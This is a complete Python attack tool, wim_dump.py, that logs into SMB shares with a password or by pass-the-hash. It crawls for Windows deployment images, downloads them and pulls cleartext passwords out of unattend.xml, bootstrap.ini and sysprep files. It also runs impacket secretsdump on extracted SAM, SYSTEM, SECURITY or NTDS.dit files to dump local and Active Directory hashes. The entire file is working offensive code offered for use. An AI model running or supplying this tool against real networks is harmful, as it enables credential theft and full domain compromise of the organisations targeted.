#!/usr/bin/env python3
"""
wim_dump.py — Download a .wim from an SMB share, extract credential-bearing
files, and dump SAM/LSA secrets from the captured Windows image.

Checks for credentials in:
  - Deploy/Scripts/bootstrap.ini       (PDQ deploy script creds)
  - Windows/Panther/unattend.xml       (sysprep answer file)
  - Windows/Panther/unattend.xml (x86) variant paths
  - Windows/System32/sysprep/unattend.xml
  - Windows/sysprep.inf                (legacy sysprep)
  - Windows/System32/sysprep/sysprep.inf
  - unattend.xml / autounattend.xml    (WDS/MDT at root)
  - Windows/NTDS/NTDS.dit + SYSTEM     (DC captures → full AD dump)
  - SAM / SYSTEM / SECURITY hives      (local account hashes + LSA secrets)

Usage:
    python3 wim_dump.py \\\\192.168.1.10\\share\\images\\capture.wim \
        -u DOMAIN\\administrator -p 'Password1' [--hash NTHASH] \
        [--image-index 1] [--out /tmp/wim_dump]

    # Crawl all readable shares on a host for .wim files, then pick one:
    python3 wim_dump.py --search 192.168.1.10 \
        -u DOMAIN\\administrator -p 'Password1'

Dependencies:
    apt install wimtools          # provides wimlib-imagex
    pip install impacket          # provides secretsdump
    impacket-secretsdump          # CLI wrapper (installed via kali)
"""

import argparse
import configparser
import os
import re
import shutil
import subprocess
import sys
import tempfile
import xml.etree.ElementTree as ET
from concurrent.futures import ThreadPoolExecutor, as_completed

# ── impacket SMB ──────────────────────────────────────────────────────────────
try:
    from impacket.smbconnection import SMBConnection
except ImportError:
    sys.exit("[!] impacket not found: pip install impacket")

# ── colors / banner ───────────────────────────────────────────────────────────
CYAN   = "\033[36m"
GREEN  = "\033[32m"
YELLOW = "\033[33m"
RED    = "\033[31m"
BOLD   = "\033[1m"
DIM    = "\033[2m"
RESET  = "\033[0m"

BANNER = rf"""{CYAN}{BOLD}
           _       ________  ___   ____  __  ____  _______
          | |     / /  _/  |/  /  / __ \/ / / /  |/  / __ \
          | | /| / // // /|_/ /  / / / / / / / /|_/ / /_/ /
          | |/ |/ // // /  / /  / /_/ / /_/ / /  / / ____/
          |__/|__/___/_/  /_/  /_____/\____/_/  /_/_/
{RESET}{DIM}      SMB share crawler · WIM extractor · credential hunter{RESET}
{DIM}      {'─' * 54}{RESET}
"""


def print_banner():
    print(BANNER)

# Shares to skip during crawl — default/admin shares rarely hold deploy images,
# IPC$ isn't a filesystem share at all, and C$/ADMIN$ crawl the entire OS
# volume (huge, slow, and full of the WinSxS/WinRE noise this tool filters).
SKIP_SHARES = {"IPC$", "PRINT$", "ADMIN$", "C$"}

# Path fragments (matched case-insensitively against the full \share\path)
# that indicate a .wim is OS/component plumbing rather than a deployment
# image: WinRE recovery partitions, WinSxS component staging, driver store,
# feature-update residue, and reset/PBR images.
NOISE_PATH_FRAGMENTS = [
    r"\windows\winsxs",
    r"\windows\system32\recovery",
    r"\windows\systemtemp",
    r"\windows\softwaredistribution",
    r"\windows\servicing",
    r"\recovery\windowsre",
    r"\recovery\customizations",
    r"$sysreset",
    r"\reagentc",
    r"\resetspec.xml",
    r"pbr.wim",
    r"winre.wim",
]


# ── credential file map ───────────────────────────────────────────────────────
# WIM paths to extract for credential hunting (case-insensitive on extraction).
# Each entry: (wim_path, description)
CRED_FILE_TARGETS = [
    # PDQ / MDT deploy scripts
    (r"\Deploy\Scripts\bootstrap.ini",          "PDQ bootstrap.ini"),
    (r"\Scripts\bootstrap.ini",                 "bootstrap.ini (root Scripts)"),
    (r"\bootstrap.ini",                          "bootstrap.ini (root)"),

    # Sysprep answer files — most common source of cleartext passwords
    (r"\Windows\Panther\unattend.xml",           "Panther unattend.xml"),
    (r"\Windows\Panther\unattend\unattend.xml",  "Panther\\unattend\\unattend.xml"),
    (r"\Windows\System32\sysprep\unattend.xml",  "sysprep unattend.xml"),
    (r"\unattend.xml",                           "unattend.xml (root)"),
    (r"\autounattend.xml",                       "AutoUnattend.xml (WDS/MDT)"),

    # Legacy sysprep.inf (XP/2003 era, still seen in old gold images)
    (r"\Windows\sysprep.inf",                    "sysprep.inf"),
    (r"\Windows\System32\sysprep\sysprep.inf",   "sysprep\\sysprep.inf"),

    # MDT / WDS task sequence variables — may contain domain join password
    (r"\Deploy\Control\CustomSettings.ini",      "MDT CustomSettings.ini"),
    (r"\Deploy\Control\Bootstrap.ini",           "MDT Bootstrap.ini"),

    # Group Policy Preferences — historically stored creds in XML (MS14-025)
    (r"\Windows\SYSVOL\sysvol",                  "SYSVOL (GPP creds)"),  # dir; may not extract

    # Registry hives
    (r"\Windows\System32\config\SAM",            "SAM hive"),
    (r"\Windows\System32\config\SYSTEM",         "SYSTEM hive"),
    (r"\Windows\System32\config\SECURITY",       "SECURITY hive"),

    # Domain controller captures
    (r"\Windows\NTDS\ntds.dit",                  "NTDS.dit (DC capture)"),
]

# Patterns that indicate a credential value in plain text
CRED_KEYWORDS = re.compile(
    r"(password|passwd|pwd|secret|adminpass|domainpass|localpass|"
    r"sapassword|localadminpassword|joinpassword|osdlocaladminpassword|"
    r"osddomainpassword|bitlockerpin|recoverykey|apikey|token|credential)",
    re.IGNORECASE,
)


# ── SMB download ──────────────────────────────────────────────────────────────

def parse_unc(unc: str):
    unc = unc.replace("smb://", "//").replace("\\", "/").lstrip("/")
    parts = unc.split("/", 2)
    if len(parts) < 3:
        sys.exit(f"[!] Cannot parse UNC path: {unc!r}")
    host, share, rel = parts
    return host, share, "\\" + rel.replace("/", "\\")


def smb_download(host, share, remote_path, local_path, username, password,
                 domain, nthash):
    lmhash = "aad3b435b51404eeaad3b435b51404ee" if nthash else ""
    print(f"[*] Connecting to {host} …")
    conn = SMBConnection(host, host, sess_port=445)
    conn.login(username, password, domain, lmhash, nthash)
    print(f"[+] Authenticated as {domain}\\{username}")
    print(f"[*] Downloading {share}{remote_path} …")
    total = [0]

    def write_chunk(data):
        fh.write(data)
        total[0] += len(data)
        print(f"\r    {total[0]/1_048_576:.1f} MB", end="", flush=True)

    with open(local_path, "wb") as fh:
        conn.getFile(share, remote_path, write_chunk)
    print(f"\n[+] Downloaded {total[0]:,} bytes → {local_path}")
    conn.logoff()


# ── share crawl / .wim search ─────────────────────────────────────────────────

def smb_connect(host, username, password, domain, nthash):
    lmhash = "aad3b435b51404eeaad3b435b51404ee" if nthash else ""
    conn = SMBConnection(host, host, sess_port=445)
    conn.login(username, password, domain, lmhash, nthash)
    return conn


def list_readable_shares(conn, skip_shares=SKIP_SHARES):
    """Return share names the current session can actually list (i.e. read)."""
    readable = []
    try:
        shares = conn.listShares()
    except Exception as e:
        sys.exit(f"[!] Failed to enumerate shares: {e}")

    for s in shares:
        name = s["shi1_netname"][:-1] if isinstance(s["shi1_netname"], str) \
            else str(s["shi1_netname"]).rstrip("\x00")
        name = name.rstrip("\x00")
        if name.upper() in skip_shares:
            print(f"    [~] {name}: skipped (admin/system share)")
            continue
        try:
            conn.listPath(name, "\\*")
        except Exception:
            print(f"    [-] {name}: no read access")
            continue
        print(f"    [+] {name}: readable")
        readable.append(name)
    return readable


def is_noise_wim(share, full_path):
    """True if a found .wim's path looks like OS/component plumbing, not a deploy image."""
    haystack = f"\\{share}{full_path}".lower()
    return any(frag in haystack for frag in NOISE_PATH_FRAGMENTS)


def crawl_share_for_wim(share, host, username, password, domain, nthash,
                        max_depth=25, start_path=""):
    """
    Recursively walk a single share looking for .wim files. Opens its own
    SMB connection so it can run in its own worker thread independent of
    other share crawls.

    start_path lets the walk begin at a subdirectory instead of the share
    root (used by --search-path to target one known-good location instead
    of crawling the whole share).

    Returns a list of (share, full_smb_path, size) tuples.
    """
    found = []
    seen_dirs = set()
    conn = smb_connect(host, username, password, domain, nthash)

    def walk(rel_path, depth):
        if depth > max_depth or rel_path in seen_dirs:
            return
        seen_dirs.add(rel_path)

        pattern = (rel_path.rstrip("\\") or "") + "\\*"
        try:
            entries = conn.listPath(share, pattern)
        except Exception:
            return

        for entry in entries:
            name = entry.get_longname()
            if name in (".", ".."):
                continue
            child = (rel_path.rstrip("\\") + "\\" + name) if rel_path else "\\" + name
            if entry.is_directory():
                walk(child, depth + 1)
            elif name.lower().endswith(".wim"):
                size = entry.get_filesize()
                noise = is_noise_wim(share, child)
                found.append((share, child, size, noise))
                tag = "noise" if noise else "found"
                print(f"    [{'~' if noise else '*'}] {tag}: \\\\{share}{child} "
                      f"({size/1_048_576:.1f} MB)")

    try:
        walk(start_path.rstrip("\\"), 0)
    finally:
        conn.logoff()
    return found


def search_host_for_wims(host, username, password, domain, nthash,
                         threads=8, skip_shares=SKIP_SHARES):
    print(f"[*] Connecting to {host} for share enumeration …")
    conn = smb_connect(host, username, password, domain, nthash)
    print(f"[+] Authenticated as {domain}\\{username}")

    print(f"\n[*] Enumerating shares on {host} …")
    shares = list_readable_shares(conn, skip_shares)
    conn.logoff()
    if not shares:
        sys.exit("[!] No readable shares found on host.")

    print(f"\n[*] Crawling {len(shares)} readable share(s) for .wim files "
          f"({threads} parallel workers) …")

    all_found = []
    with ThreadPoolExecutor(max_workers=min(threads, len(shares))) as pool:
        futures = {
            pool.submit(crawl_share_for_wim, share, host, username, password,
                       domain, nthash): share
            for share in shares
        }
        for fut in as_completed(futures):
            share = futures[fut]
            try:
                all_found.extend(fut.result())
            except Exception as e:
                print(f"    [-] {share}: crawl failed ({e})")

    return all_found


def search_path_for_wims(host, share, start_path, username, password, domain, nthash):
    """
    Crawl a single, caller-specified share (optionally starting at a subpath)
    for .wim files, skipping share enumeration entirely. Used by --search-path
    when the target share is already known and a full --search of every share
    on the host would be slow or noisy.
    """
    where = f"\\\\{host}\\{share}" + (start_path if start_path else "")
    print(f"[*] Crawling {where} for .wim files …")
    found = crawl_share_for_wim(share, host, username, password, domain, nthash,
                               start_path=start_path)
    return found


GREEN = "\033[32m"
RESET = "\033[0m"


def _parse_index_list(choice, count):
    """
    Parse a user-supplied selection string into a sorted list of 1-based
    indices. Accepts comma/space-separated numbers and ranges, e.g.
    "1,3,5", "1-4", "1, 3-5, 8". Returns None if nothing valid was parsed.
    """
    indices = set()
    tokens = re.split(r"[,\s]+", choice.strip())
    for tok in tokens:
        if not tok:
            continue
        m = re.match(r"^(\d+)-(\d+)$", tok)
        if m:
            lo, hi = int(m.group(1)), int(m.group(2))
            if lo > hi:
                lo, hi = hi, lo
            for n in range(lo, hi + 1):
                if 1 <= n <= count:
                    indices.add(n)
        elif tok.isdigit():
            n = int(tok)
            if 1 <= n <= count:
                indices.add(n)
    return sorted(indices) or None


def prompt_wim_selection(host, found, processed=None):
    """
    Print numbered list of discovered .wim files (flagging likely OS/component
    noise, and highlighting any already processed this run) and prompt the
    user to pick file(s) to download/extract, or exit.

    Accepts a single number, a comma/space-separated list ("1,3,5" or
    "1 3 5"), a range ("1-4"), a mix of both ("1,3-5"), "all"/"a" to select
    every file found, or "0"/blank/q to exit.

    Returns a list of UNC path strings (empty/None-equivalent means exit).
    """
    processed = processed or set()
    print(f"\n{'='*60}")
    print(f"  WIM SEARCH RESULTS — {len(found)} file(s) found on {host}")
    print(f"{'='*60}")
    for i, (share, path, size, noise) in enumerate(found, 1):
        unc = f"\\\\{host}\\{share}{path}"
        size_str = f"{size/1_048_576:,.1f} MB" if size else "unknown size"
        flag = "  [likely noise: WinSxS/WinRE/component]" if noise else ""
        line = f"  [{i}] {unc}  ({size_str}){flag}"
        if unc in processed:
            print(f"{GREEN}{line}  [processed]{RESET}")
        else:
            print(line)
    print(f"  [A] All")
    print(f"  [0] Exit")

    while True:
        choice = input(
            "\nSelect file(s) to process — number, list (e.g. 1,3,5), "
            "range (e.g. 1-4), 'all', or 0 to exit: "
        ).strip()
        if choice == "0" or choice.lower() in ("q", "quit", "exit", ""):
            return []
        if choice.lower() in ("a", "all"):
            return [f"\\\\{host}\\{share}{path}" for share, path, _, _ in found]
        selected = _parse_index_list(choice, len(found))
        if selected:
            return [f"\\\\{host}\\{found[i-1][0]}{found[i-1][1]}" for i in selected]
        print("[!] Invalid selection, try again.")


# ── wimlib helpers ────────────────────────────────────────────────────────────

def check_wimlib():
    exe = shutil.which("wimlib-imagex")
    if not exe:
        sys.exit(
            "[!] wimlib-imagex not found.\n"
            "    Install: sudo apt install wimtools"
        )
    return exe


def wim_list_images(wim_path, wimlib):
    out = subprocess.check_output([wimlib, "info", wim_path],
                                  text=True, stderr=subprocess.DEVNULL)
    images, idx, name = [], None, None
    for line in out.splitlines():
        line = line.strip()
        m = re.match(r"^Index\s*:\s*(\d+)$", line)
        if m:
            idx = int(m.group(1))
        m2 = re.match(r"^Name\s*:\s*(.+)$", line)
        if m2 and idx is not None:
            images.append((idx, m2.group(1)))
            idx = None
    return images


# wimlib matches WIM paths CASE-SENSITIVELY on Linux by default. Real deployment
# images vary the casing of deploy paths (\Deploy\Scripts\bootstrap.ini vs
# \deploy\scripts\Bootstrap.ini …), so an exact-case target list silently misses
# them. WIMLIB_IMAGEX_IGNORE_CASE=1 makes matching case-insensitive, matching how
# these files behave on the Windows box that authored the image.
_WIMLIB_ENV = {**os.environ, "WIMLIB_IMAGEX_IGNORE_CASE": "1"}


# Filenames that are worth extracting wherever they appear in an image, regardless
# of the directory they live in. Real MDT/PDQ/WDS layouts put these under many
# different roots (\Deploy\Scripts, \MDT\Control, \Scripts, task-sequence folders …),
# so a filename sweep catches what the fixed CRED_FILE_TARGETS path list can't.
CRED_FILENAMES = {
    "bootstrap.ini":       "bootstrap.ini",
    "customsettings.ini":  "MDT CustomSettings.ini",
    "unattend.xml":        "unattend.xml",
    "autounattend.xml":    "AutoUnattend.xml",
    "sysprep.inf":         "sysprep.inf",
    "sysprep.xml":         "sysprep.xml",
    "lite touch.ini":      "LiteTouch.ini",
    " litetouch.ini":      "LiteTouch.ini",
}


def wim_list_paths(wim_path, image_index, wimlib):
    """Return every file path in an image as backslash WIM paths (\\Dir\\file).

    Uses `wimlib-imagex dir`, which prints one forward-slash absolute path per line.
    Returns [] if the listing fails (e.g. index doesn't exist) so callers degrade to
    the fixed target list rather than crashing.
    """
    try:
        out = subprocess.check_output(
            [wimlib, "dir", wim_path, str(image_index)],
            text=True, stderr=subprocess.DEVNULL, env=_WIMLIB_ENV)
    except subprocess.CalledProcessError:
        return []
    paths = []
    for line in out.splitlines():
        line = line.rstrip("\r\n")
        if not line or line == "/":
            continue
        paths.append("\\" + line.lstrip("/").replace("/", "\\"))
    return paths


def sweep_cred_files(wim_path, image_index, wimlib):
    """Discover credential files anywhere in the image by filename.

    Returns a list of (wim_path, description) for every path whose leaf filename is
    in CRED_FILENAMES — the catch-all that finds deploy creds at non-standard paths
    the hardcoded CRED_FILE_TARGETS list would miss.
    """
    discovered = []
    for p in wim_list_paths(wim_path, image_index, wimlib):
        leaf = p.rsplit("\\", 1)[-1].lower()
        desc = CRED_FILENAMES.get(leaf)
        if desc:
            discovered.append((p, desc))
    return discovered


def wim_extract(wim_path, dest_dir, image_index, wim_entry, wimlib, subdir=None):
    """Extract a single WIM path (case-insensitively). Returns local path if found.

    wimlib flattens an extracted file to its leaf name under --dest-dir, so two
    source paths with the same filename (e.g. two unattend.xml) would collide.
    Pass `subdir` to extract into an isolated folder so same-named files coexist.
    """
    target_dir = os.path.join(dest_dir, subdir) if subdir else dest_dir
    os.makedirs(target_dir, exist_ok=True)
    # --nullglob: a target that doesn't exist is a no-op, not a hard error, so one
    # missing path never aborts the rest of the credential sweep.
    cmd = [wimlib, "extract", wim_path, str(image_index),
           wim_entry, "--dest-dir", target_dir, "--no-acls", "--nullglob"]
    subprocess.run(cmd, capture_output=True, text=True, env=_WIMLIB_ENV)
    leaf = wim_entry.rstrip("\\").split("\\")[-1]
    candidate = os.path.join(target_dir, leaf)
    if os.path.exists(candidate):
        return candidate
    return None


def _dedup_extracted(extracted: dict) -> dict:
    """
    Collapse entries that refer to the same file *in the WIM image*, keyed by the
    normalized (case-insensitive) WIM source path — not the local extraction path,
    which is now unique per target. This drops the common double-hit where one image
    file is matched by both a fixed CRED_FILE_TARGETS entry and the filename sweep.
    Keeps the first match (fixed targets are listed before swept ones).
    """
    seen = set()
    deduped = {}
    for wim_entry, payload in extracted.items():
        key = wim_entry.strip("\\").lower()
        if key in seen:
            continue
        seen.add(key)
        deduped[wim_entry] = payload
    return deduped


# ── credential parsers ────────────────────────────────────────────────────────

def _flag(label, key, value, findings):
    """Print and record an interesting credential finding."""
    line = f"[!] {label} → {key} = {value}"
    print(line)
    findings.append(line)


def parse_ini_file(path, label, findings):
    """Parse INI-style files (bootstrap.ini, CustomSettings.ini, sysprep.inf)."""
    print(f"\n[+] {label}: {path}")
    print("-" * 60)
    results = {}
    try:
        cfg = configparser.RawConfigParser()
        cfg.read(path, encoding="utf-8-sig")
        for section in cfg.sections():
            print(f"  [{section}]")
            for key, val in cfg.items(section):
                print(f"    {key} = {val}")
                results[key.lower()] = val
    except Exception:
        with open(path, encoding="utf-8-sig", errors="replace") as fh:
            for line in fh:
                line = line.strip()
                if line and not line.startswith(("#", ";")):
                    print(f"  {line}")
                    if "=" in line:
                        k, _, v = line.partition("=")
                        results[k.strip().lower()] = v.strip()
    print("-" * 60)
    for key, val in results.items():
        if val and CRED_KEYWORDS.search(key):
            _flag(label, key, val, findings)
    return results


def parse_unattend_xml(path, label, findings):
    """
    Parse unattend.xml / autounattend.xml for credential-bearing elements.
    Common locations:
      //AutoLogon/Password/Value
      //LocalAccounts/LocalAccount/Password/Value
      //AdministratorPassword/Value
      //DomainAccounts (join creds)
      //UserAccounts/AdministratorPassword/Value
    """
    print(f"\n[+] {label}: {path}")
    print("-" * 60)

    # Strip XML namespace prefixes so ElementTree finds tags reliably
    try:
        with open(path, encoding="utf-8-sig", errors="replace") as fh:
            raw = fh.read()
    except Exception as e:
        print(f"  [~] Cannot read: {e}")
        return

    # Strip all namespace declarations and prefixes so ElementTree parses cleanly.
    # 1) Remove xmlns="..." and xmlns:foo="..." declarations
    raw_stripped = re.sub(r'\s+xmlns(?::[a-zA-Z0-9_]+)?="[^"]*"', "", raw)
    # 2) Remove namespace-prefixed attributes (e.g. wcm:action="add")
    raw_stripped = re.sub(r'\s+[a-zA-Z0-9_]+:[a-zA-Z0-9_]+=(?:"[^"]*"|\'[^\']*\')', "", raw_stripped)
    # 3) Remove namespace prefixes from element open/close tags
    raw_stripped = re.sub(r'<([a-zA-Z0-9_]+):[a-zA-Z0-9_]', r'<\1_', raw_stripped)
    raw_stripped = re.sub(r'</([a-zA-Z0-9_]+):[a-zA-Z0-9_]', r'</\1_', raw_stripped)

    try:
        root = ET.fromstring(raw_stripped)
    except ET.ParseError as e:
        print(f"  [~] XML parse failed ({e}); falling back to regex scan")
        _xml_regex_scan(raw, label, findings)
        return

    # Elements known to hold passwords
    password_tags = [
        "Value",           # child of Password, AdministratorPassword, etc.
        "PlainText",       # sibling of Value — if false, value is base64
        "Username",
        "Password",
        "AdministratorPassword",
    ]

    def walk(node, breadcrumb=""):
        tag = node.tag.split("}")[-1] if "}" in node.tag else node.tag
        path_here = f"{breadcrumb}/{tag}"
        text = (node.text or "").strip()

        if text and CRED_KEYWORDS.search(path_here):
            _flag(label, path_here, text, findings)
        elif text and tag in password_tags:
            _flag(label, path_here, text, findings)

        for child in node:
            walk(child, path_here)

    walk(root)

    # Also do a raw regex pass to catch anything the tree walk missed
    _xml_regex_scan(raw, label, findings)
    print("-" * 60)


def _xml_regex_scan(raw, label, findings):
    """Regex fallback: find >value< pairs near credential-related tags."""
    # Match <SomePasswordTag>value</SomePasswordTag>
    pattern = re.compile(
        r"<([^/>\s]*(?:Password|Secret|Key|Token|Credential|AdminPass)"
        r"[^/>\s]*)>([^<]{1,256})</\1>",
        re.IGNORECASE,
    )
    for m in pattern.finditer(raw):
        tag, val = m.group(1), m.group(2).strip()
        if val and val.lower() not in ("false", "true", "yes", "no"):
            line = f"[!] {label} (regex) → <{tag}> = {val}"
            if line not in findings:
                print(line)
                findings.append(line)


# ── secretsdump ──────────────────────────────────────────────────────────────

def run_secretsdump(sam, system, security, ntds, out_dir):
    exe = shutil.which("impacket-secretsdump")
    exe_args = [exe] if exe else [sys.executable, "-m", "impacket.examples.secretsdump"]
    out_file = os.path.join(out_dir, "secretsdump.txt")

    if ntds and os.path.exists(ntds):
        # DC capture — full AD dump
        cmd = exe_args + ["-ntds", ntds, "-system", system, "LOCAL"]
        print("\n[*] NTDS.dit detected — performing full AD secretsdump …")
    else:
        cmd = exe_args + ["-sam", sam, "-system", system, "LOCAL"]
        if security and os.path.exists(security):
            cmd = cmd[:-1] + ["-security", security, "LOCAL"]
        print("\n[*] Running secretsdump (local hives) …")

    print(f"    {' '.join(cmd)}")
    result = subprocess.run(cmd, capture_output=True, text=True)
    combined = result.stdout + "\n" + result.stderr

    with open(out_file, "w") as fh:
        fh.write(combined)

    print("\n" + "=" * 60)
    print(combined.strip())
    print("=" * 60)
    print(f"[+] secretsdump output → {out_file}")
    return out_file


# ── main ──────────────────────────────────────────────────────────────────────

def main():
    print_banner()

    ap = argparse.ArgumentParser(
        description="Download WIM from SMB, hunt credentials, dump SAM/LSA/NTDS"
    )
    ap.add_argument("wim_unc", nargs="?", default="",
                    help=r"UNC or local path to .wim (omit when using --search)")
    ap.add_argument("-s", "--search", metavar="HOST",
                    help="Crawl all readable shares on HOST for .wim files, "
                         "then prompt for one to download/extract")
    ap.add_argument("--search-path", metavar="UNC",
                    help=r"Crawl a single share (optionally starting at a "
                         r"subpath) for .wim files, then prompt for one — "
                         r"e.g. '\\192.168.1.10\deploy\images\2023'. Skips "
                         r"share enumeration; use when --search finds too "
                         r"many shares and you just want to target one.")
    ap.add_argument("--threads", type=int, default=8,
                    help="Parallel share-crawl workers for --search (default: 8)")
    ap.add_argument("--include-admin-shares", action="store_true",
                    help="Also crawl C$/ADMIN$ during --search (default: "
                         "skipped — they cover the whole OS volume and are "
                         "slow/noisy)")
    ap.add_argument("-u", "--username", default="")
    ap.add_argument("-p", "--password", default="")
    ap.add_argument("--hash", dest="nthash", default="",
                    help="NT hash for pass-the-hash")
    ap.add_argument("--domain", default="")
    ap.add_argument("--image-index", type=int, default=0,
                    help="Scan a single image index only (default: all images)")
    ap.add_argument("--out", default="",
                    help="Output directory (default: auto temp dir)")
    ap.add_argument("--no-download", action="store_true",
                    help="Treat wim_unc as local path, skip SMB download")
    args = ap.parse_args()

    username, domain = args.username, args.domain
    if "\\" in username:
        domain, username = username.split("\\", 1)

    if not args.search and not args.search_path and not args.wim_unc:
        ap.error("wim_unc is required unless --search/-s or --search-path is used")
    if args.search and args.search_path:
        ap.error("--search and --search-path are mutually exclusive")

    out_dir = args.out or tempfile.mkdtemp(prefix="wim_dump_")
    os.makedirs(out_dir, exist_ok=True)
    print(f"[*] Output directory: {out_dir}")

    wimlib = check_wimlib()

    # ── search mode: crawl shares for .wim files, then prompt for one ──
    if args.search:
        skip_shares = set() if args.include_admin_shares else SKIP_SHARES
        found = search_host_for_wims(args.search, username, args.password,
                                     domain, args.nthash,
                                     threads=args.threads,
                                     skip_shares=skip_shares)
        if not found:
            sys.exit("[!] No .wim files found on any readable share.")

        processed = set()
        while True:
            selected_uncs = prompt_wim_selection(args.search, found, processed)
            if not selected_uncs:
                print("[*] Exiting.")
                return

            for i, selected_unc in enumerate(selected_uncs, 1):
                print(f"\n[*] Processing {i}/{len(selected_uncs)}: {selected_unc}")
                image_out_dir = tempfile.mkdtemp(prefix="wim_dump_", dir=out_dir)
                process_wim(selected_unc, no_download=False,
                           username=username, password=args.password,
                           domain=domain, nthash=args.nthash,
                           image_index=args.image_index,
                           out_dir=image_out_dir, wimlib=wimlib)
                processed.add(selected_unc)
        return

    # ── search-path mode: crawl one caller-specified share, then prompt ──
    if args.search_path:
        raw = args.search_path.replace("smb://", "//").replace("\\", "/").lstrip("/")
        parts = raw.split("/", 2)
        if len(parts) < 2:
            sys.exit(f"[!] --search-path needs at least \\\\host\\share: {args.search_path!r}")
        host, share = parts[0], parts[1]
        start_path = "\\" + parts[2].replace("/", "\\") if len(parts) == 3 else ""
        found = search_path_for_wims(host, share, start_path, username,
                                     args.password, domain, args.nthash)
        if not found:
            sys.exit("[!] No .wim files found under the given share/path.")

        processed = set()
        while True:
            selected_uncs = prompt_wim_selection(host, found, processed)
            if not selected_uncs:
                print("[*] Exiting.")
                return

            for i, selected_unc in enumerate(selected_uncs, 1):
                print(f"\n[*] Processing {i}/{len(selected_uncs)}: {selected_unc}")
                image_out_dir = tempfile.mkdtemp(prefix="wim_dump_", dir=out_dir)
                process_wim(selected_unc, no_download=False,
                           username=username, password=args.password,
                           domain=domain, nthash=args.nthash,
                           image_index=args.image_index,
                           out_dir=image_out_dir, wimlib=wimlib)
                processed.add(selected_unc)
        return

    # ── single-file mode (no --search / --search-path) ──
    process_wim(args.wim_unc, no_download=args.no_download,
               username=username, password=args.password,
               domain=domain, nthash=args.nthash,
               image_index=args.image_index,
               out_dir=out_dir, wimlib=wimlib)


def process_wim(wim_unc, no_download, username, password, domain, nthash,
                image_index, out_dir, wimlib):
    """Acquire (if needed) and fully process a single .wim: extract, parse
    credential files, and run secretsdump against every image inside it."""

    # ── acquire WIM ──
    if no_download:
        wim_local = wim_unc
        if not os.path.exists(wim_local):
            print(f"[!] Local WIM not found: {wim_local}")
            return
        print(f"[*] Using local WIM: {wim_local}")
    else:
        host, share, remote_path = parse_unc(wim_unc)
        wim_local = os.path.join(out_dir, "capture.wim")
        smb_download(host, share, remote_path, wim_local,
                     username, password, domain, nthash)

    # ── list images ──
    images = wim_list_images(wim_local, wimlib)
    if images:
        print(f"\n[*] WIM contains {len(images)} image(s):")
        for idx, name in images:
            print(f"    [{idx}] {name}")
    else:
        # Couldn't enumerate — fall back to index 1
        images = [(1, "unknown")]

    # Determine which image indices to scan
    if image_index:
        scan_indices = [(image_index, next(
            (n for i, n in images if i == image_index), "unknown"))]
    else:
        scan_indices = images

    all_findings = []   # aggregated across all images

    for img_idx, img_name in scan_indices:
        print(f"\n{'#'*60}")
        print(f"  IMAGE [{img_idx}]: {img_name}")
        print(f"{'#'*60}")

        extract_root = os.path.join(out_dir, f"image_{img_idx}")
        findings = []

        # ── extract credential files ──
        # Known fixed paths first (keeps the exact SAM/SYSTEM/NTDS keys the
        # secretsdump step looks up), then a filename sweep of the whole image to
        # catch deploy creds sitting at non-standard paths / casing.
        print(f"\n[*] Extracting credential files …")
        targets = list(CRED_FILE_TARGETS)
        swept = sweep_cred_files(wim_local, img_idx, wimlib)
        if swept:
            known = {t[0].lower() for t in targets}
            new = [s for s in swept if s[0].lower() not in known]
            if new:
                print(f"    [+] Sweep found {len(new)} additional credential "
                      f"file(s) at non-standard paths:")
                for p, _ in new:
                    print(f"        {p}")
            targets.extend(new)

        extracted = {}
        for wim_entry, description in targets:
            # EVERY target extracts into its own per-path subdir. Without this, all
            # same-leaf targets share one dir, so a leftover file from an earlier
            # extraction (e.g. \Deploy\Scripts\bootstrap.ini) makes a later target
            # that does NOT exist (\Deploy\Control\Bootstrap.ini) falsely "match" —
            # and the finding gets mislabeled with the wrong source path.
            subdir = re.sub(r"[^A-Za-z0-9]+", "_", wim_entry).strip("_")
            local = wim_extract(wim_local, extract_root, img_idx,
                                wim_entry, wimlib, subdir=subdir)
            if local:
                extracted[wim_entry] = (local, description)

        extracted = _dedup_extracted(extracted)

        if not extracted:
            print("  [~] No credential files found in this image — skipping.")
            continue

        # ── parse each found file ──
        print(f"\n{'='*60}")
        print(f"  CREDENTIAL FILE SCAN — image {img_idx}")
        print(f"{'='*60}")

        for wim_entry, (local_path, description) in extracted.items():
            name_lower = os.path.basename(local_path).lower()
            # Every finding carries the file's WIM source path so it's obvious where
            # a credential came from (e.g. "PDQ bootstrap.ini [\Deploy\Scripts\bootstrap.ini]").
            label = f"{description} [{wim_entry}]"

            if name_lower.endswith(".xml"):
                parse_unattend_xml(local_path, label, findings)

            elif name_lower.endswith(".ini") or name_lower.endswith(".inf"):
                parse_ini_file(local_path, label, findings)

            elif name_lower in ("sam", "system", "security", "ntds.dit"):
                pass  # handled by secretsdump below

            else:
                print(f"\n[+] {label}: {local_path}")
                print("-" * 60)
                try:
                    with open(local_path, encoding="utf-8-sig", errors="replace") as fh:
                        for i, line in enumerate(fh, 1):
                            line = line.rstrip()
                            if CRED_KEYWORDS.search(line):
                                print(f"  line {i}: {line}")
                                findings.append(f"[!] {label} line {i}: {line}")
                except Exception as e:
                    print(f"  [~] Cannot read: {e}")
                print("-" * 60)

        # ── secretsdump ──
        sam      = extracted.get(r"\Windows\System32\config\SAM",     (None,))[0]
        system   = extracted.get(r"\Windows\System32\config\SYSTEM",  (None,))[0]
        security = extracted.get(r"\Windows\System32\config\SECURITY",(None,))[0]
        ntds     = extracted.get(r"\Windows\NTDS\ntds.dit",           (None,))[0]

        if system and (sam or ntds):
            run_secretsdump(
                sam=sam or "",
                system=system,
                security=security or "",
                ntds=ntds or "",
                out_dir=extract_root,
            )
        else:
            print("\n[~] SAM/SYSTEM hives not found — skipping secretsdump for this image.")

        # Tag findings with image index and accumulate
        tagged = [f"[img {img_idx}] {f}" for f in findings]
        all_findings.extend(tagged)

    # ── global summary ──
    print(f"\n{'='*60}")
    print(f"  FINDINGS SUMMARY — {len(scan_indices)} image(s) scanned, "
          f"{len(all_findings)} hit(s)")
    print(f"{'='*60}")
    if all_findings:
        for f in all_findings:
            print(f)
    else:
        print("  No plaintext credentials found in any image.")
    print(f"\n[+] All output in: {out_dir}")


if __name__ == "__main__":
    main()
